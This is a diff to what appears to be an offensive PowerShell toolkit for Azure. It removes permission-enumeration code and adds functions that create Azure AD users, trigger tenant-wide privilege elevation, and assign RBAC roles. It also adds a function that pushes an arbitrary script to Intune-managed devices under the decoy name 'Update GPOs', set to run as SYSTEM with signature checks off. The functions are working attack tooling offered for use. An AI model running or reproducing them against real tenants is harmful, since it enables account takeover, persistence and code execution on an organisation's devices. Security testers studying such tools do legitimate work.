-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'action')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}			
-				}			
-				If ($paths.count -eq 4)
-				{
-					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2]
-					$last = $action.Split("/") | select -last 1
-					If ($last -eq '*')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'write')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'read')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'action')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}			
-				}		
-				If ($paths.count -eq 5)
-				{
-					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2] + "/" + $paths[3]
-					$last = $action.Split("/") | select -last 1
-					If ($last -eq '*')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'write')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'read')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'action')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}			
-				}
-				If ($paths.count -eq 6)
-				{
-					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2] + "/" + $paths[3] + "/" + $paths[4]
-					$last = $action.Split("/") | select -last 1
-					If ($last -eq '*')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result				
-						}
-					}
-					elseif ($last -eq 'write')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result				
-						}
-					}
-					elseif ($last -eq 'read')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result				
-						}
-					}
-					elseif ($last -eq 'action')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result				
-						}
-					}			
-				}
-			}
-		}
+
+    }
+
+
 }
 
 function Get-AzureRolePermission
@@ -1917,17 +1843,19 @@ function New-AzureUser
 	}
 	else
 	{
+        $Context = Get-AzContext
+        $name = $Username.Split('@')[0]
         $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
-	    $make = New-AzADUser -UserPrincipalName $Username -Password $SecurePassword
+	    $make = New-AzADUser -UserPrincipalName $Username -Password $SecurePassword -DisplayName $name -MailNickname $name
 	    If($make)
 	    {
 		    Write-Host "Success! Please login with:" -ForegroundColor Green
-		    Write-Host "Connect-AzAccount $Username -p $Password" -ForegroundColor Yellow
+		    Write-Host '$Credential = Get-Credential; Connect-AzAccount -Credential $Credential -Tenant '$Context.Tenant.Id'' -ForegroundColor Yellow
 	    }
     }	
 }
 
-function Set-ElevatedPrivileges
+function Set-AzureElevatedPrivileges
 {
 <# 
 .SYNOPSIS
@@ -1936,9 +1864,8 @@ function Set-ElevatedPrivileges
 .EXAMPLE
 	Set-ElevatedPrivileges
 #>
-    $Headers = Get-AzureGraphToken 
-	$req = Invoke-RestMethod -ContentType 'application/json' -Headers $Headers -Method Post -Uri https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01 | ConvertTo-Json
-	If($req -eq '""')
+	$req = Invoke-AzRestMethod -Path /providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01 -Method POST
+	If($req -eq '')
 	{
 		Write-Host "Success! Re-login for permissions to take effect. You can now add yourself as an Owner to any resources in Azure!" -ForegroundColor Green
 	}
@@ -2003,5 +1930,116 @@ function Get-AzureRole
         Write-Host "Get-AzureRole -All" -ForegroundColor Red
 	}
 	
+
+}
+
+function Add-AzureRole
+{
+<# 
+.SYNOPSIS
+    Adds a role to a user in Azure RBAC
+
+.PARAMETERS
+	-Role
+	-Username
+    -Scope  
+	
+	
+.EXAMPLE
+	Add-AzureRole -Role 'Contributor' -Username test@contoso.com -Scope "/subscriptions/86f81fc3-b00f-48cd-8218-3879f51ff362"
+#>
+    [CmdletBinding()]
+    Param(
+	[Parameter(Mandatory=$true)][String]$Role = $null,
+    [Parameter(Mandatory=$true)][String]$Scope = $null,
+	[Parameter(Mandatory=$true)][Switch]$Username = $null)
+    New-AzRoleAssignment -SignInName $Username -RoleDefinitionName $Role -Scope $Scope
+}
+
+function Get-AzureIntuneScript
+{
+<# 
+.SYNOPSIS
+    Lists the scripts available in InTune. 
+	
+.EXAMPLE
+	Get-AzureInTuneScript
+#>
+$m = Get-Module -Name Microsoft.Graph.Intune -ListAvailable
+if (-not $m)
+{
+    Install-Module NuGet -Force
+    Install-Module Microsoft.Graph.Intune
+}
+Import-Module Microsoft.Graph.Intune -Global
+Connect-MSGraph -AdminConsent | Out-Null
+$req = Invoke-MSGraphRequest -Url "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -HttpMethod GET
+$req.value 
+}
+
+function New-AzureIntuneScript
+{
+<# 
+.SYNOPSIS
+    Creates a new script in Intune by uploading a supplied script
+
+.PARAMETERS
+	-Script (Full path to script)	
+	
+.EXAMPLE
+	New-AzureIntuneScript -Script 'C:\temp\test.ps1'
+#>
+    [CmdletBinding()]
+    Param(
+	[Parameter(Mandatory=$true)][String]$Script = $null)
+
+$m = Get-Module -Name Microsoft.Graph.Intune -ListAvailable
+if (-not $m)
+{
+    Install-Module NuGet -Force
+    Install-Module Microsoft.Graph.Intune
+}
+Import-Module Microsoft.Graph.Intune -Global
+Connect-MSGraph -AdminConsent | Out-Null
+$ScriptName = 'Update-GPO'
+$Params = @{
+    ScriptName = $ScriptName
+    ScriptContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path "$Script" -Raw -Encoding UTF8)))
+    DisplayName = "Update GPOs"
+    Description = "Updates group policies"
+    RunAsAccount = "system"
+    EnforceSignatureCheck = "false"
+    RunAs32Bit = "false"
+}
+$Json = @"
+{
+    "@odata.type": "#microsoft.graph.deviceManagementScript",
+    "displayName": "$($params.DisplayName)",
+    "description": "$($Params.Description)",
+    "scriptContent": "$($Params.ScriptContent)",
+    "runAsAccount": "$($Params.RunAsAccount)",
+    "enforceSignatureCheck": $($Params.EnforceSignatureCheck),
+    "fileName": "$($Params.ScriptName)",
+    "runAs32Bit": $($Params.RunAs32Bit)
+}
+"@
+Invoke-MSGraphRequest -HttpMethod POST -Url "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -Content $Json
+
+}
+
+function Get-AzureLogicAppConnector
+{
+<# 
+.SYNOPSIS
+    Lists the connectors used in Logic Apps
+
+.PARAMETERS
+	-Script (Full path to script)	
+	
+.EXAMPLE
+	New-AzureIntuneScript -Script 'C:\temp\test.ps1'
+#>
+
+Get-AzResource | Where-Object {$_.ResourceType -eq 'Microsoft.Web/Connections' -and $_.ResourceId -match 'azuread'}
 
 }
